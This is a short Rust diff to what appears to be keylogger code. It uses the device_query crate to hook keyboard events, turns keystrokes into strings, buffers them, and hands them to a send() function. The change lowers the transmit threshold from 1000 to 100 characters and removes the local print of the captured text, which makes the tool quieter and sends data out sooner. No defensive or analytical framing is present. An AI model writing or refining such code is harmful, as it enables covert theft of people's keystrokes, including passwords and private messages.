@@ -1,5 +1,5 @@
 use std::sync::{Arc, Mutex};
-use device_query::{DeviceEvents, device_state};
+use device_query::{DeviceEvents};
 use device_query::Keycode;
 pub use device_query::device_events::KeyboardCallback;
 use device_query::{DeviceState, keymap};
@@ -30,9 +30,8 @@ fn listen2(device_state: DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
         let chars = keycode_to_string(*keys); 
         let mut cache = cache_clone.lock().unwrap();
         cache.push_str(chars);
-        if cache.len() >= 1000 {
+        if cache.len() >= 100 {
             send(cache.clone()); 
-            println!("{}", cache);
             cache.clear();
             }
         }
